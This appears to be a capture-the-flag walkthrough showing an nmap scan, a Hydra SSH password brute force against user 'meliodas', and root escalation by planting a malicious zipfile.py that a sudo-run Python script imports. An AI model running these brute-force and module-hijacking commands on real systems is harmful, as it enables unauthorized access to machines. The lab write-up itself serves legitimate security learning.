
---

# Privilege Escalation Walkthrough

## 1. Enumeration with Nmap

First, we perform a port scan on the target host to identify open services:

```bash
nmap -Pn -sV 0.0.0.0
```

- The scan reveals port **80 (HTTP)** is open.
    
- Exploring the web service discloses a potential username: **`meliodas`**.
    

---

## 2. Brute-Forcing SSH Credentials

Using Hydra, we attempt to crack the SSH password for the discovered user:

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://0.0.0.0
```

- Successful login found:
    
    - **Username:** `meliodas`
        
    - **Password:** `iloveyou1`
        

We can now authenticate to the system:

```bash
ssh meliodas@0.0.0.0
```

---

## 3. Local Enumeration & Privilege Escalation

Once inside, we inspect files and configurations. A suspicious Python script `bak.py` is found.  
On review, we notice it imports a module (`zipfile`) that is not a built-in dependency of the script — making it vulnerable to **Python library hijacking**.

---

## 4. Exploiting Python Module Hijacking

We replace the `zipfile.py` module locally under `/home/meliodas/` with a malicious payload:

```bash
echo 'import os; os.system("cat /root/root.txt")' > /home/meliodas/zipfile.py
```

Then, execute the vulnerable script with elevated privileges:

```bash
sudo python3 /home/meliodas/bak.py
```

Since Python imports the local malicious `zipfile.py`, our payload is executed with root permissions.

---

## 5. Obtaining the Root Flag

As a result, the contents of `/root/root.txt` are displayed — successfully escalating privileges to root.

---

## Summary

- **Initial foothold:** Discovered username `meliodas` via web and cracked SSH password with Hydra.
    
- **Privilege escalation:** Exploited Python local module hijacking via `bak.py`.
    
- **Outcome:** Retrieved the root flag.
    

---